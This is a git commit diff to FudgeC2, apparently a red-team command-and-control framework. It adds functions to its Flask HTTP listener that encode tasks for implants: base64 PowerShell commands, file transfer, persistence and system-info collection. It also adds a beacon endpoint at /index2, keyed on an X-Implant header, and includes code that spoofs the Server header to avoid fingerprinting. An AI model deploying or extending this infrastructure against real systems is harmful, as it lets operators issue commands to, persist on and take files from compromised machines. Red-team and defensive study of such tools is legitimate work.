3236d9488786a5d9d88c655ea0c1b9db925a66e5
Kris Anderson <kristoferanderson90@gmail.com>
2019-09-21 11:03:44 +0100

    Adding new listener under test endpoint index2
    CHanges to the implant to align the endpoint output is required.

--- FudgeC2/Listeners/HttpListener.py
+++ FudgeC2/Listeners/HttpListener.py
@@ -11,13 +11,57 @@ db = Database()
 app = Flask(str(uuid4()))
 app.config['SECRET_KEY'] = str(uuid4())
 
+# Adding the functions which manage encoding built in commands for transfer
+def craft_sound_file(path):
+    print("Crafting audio file")
+    with open(path, 'rb') as file:
+        blah = "PS".encode()+base64.b64encode(file.read())
+
+        print(type(blah))
+    return blah
+
+
+def craft_powershell_native_command(args):
+    print(args, args['args'].encode())
+    a = base64.b64encode(args['args'].encode()).decode()
+    b = args['type']+a
+    print(b)
+    return b
+
+
+def craft_file_upload(value_dict):
+    return str(value_dict['type'])
+
+
+def craft_file_download(value_dict):
+    return str(value_dict['type'])
+
+
+def craft_enable_persistence(value_dict):
+    return str(value_dict['type'])
+
+
+def craft_sys_info(value_dict):
+    return str(value_dict['type'])
+
+#
+preprocessing = {
+    "PS": craft_sound_file,
+    "CM": craft_powershell_native_command,
+    "FU": craft_file_upload,
+    "FD": craft_file_download,
+    "EP": craft_enable_persistence,
+    "SI": craft_sys_info,
+    }
+
+
 
 @app.before_request
 def before_request():
     # TODO: Implement IP whitelist and reject if connection if it is not a valid src IP.
     return
 
-
+# Removing the Werkzeug header to reduce Fudges server fingerprinting.
 @app.after_request
 def alter_headers(response):
     response.headers['Server'] = "Apache/2.4.1 (Unix)"
@@ -52,6 +96,24 @@ def ImplantCheckIn():
         response = make_response("Page Not Found")
         response.headers["X-Command"] = "=="
     return response
+
+
+@app.route("/index2", methods=["GET", "POST"])
+def implant_beacon_endpoint():
+    if 'X-Implant' not in request.headers:
+       return "404"
+    print(request.data)
+    # This will be replaced by the check for a valid implant_id in production.
+    if request.headers['X-Implant'] == "870428":
+        next_cmd = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
+        print(preprocessing[next_cmd['type']])
+        processed_return_val = preprocessing[next_cmd['type']](next_cmd)
+        # We process the next_cmd dictionary to determine any unique pre-processing we must perform
+        print(len(processed_return_val))
+        return processed_return_val
+
+    return "0"
+
 
 
 @app.route("/help", methods=['GET', 'POST'])
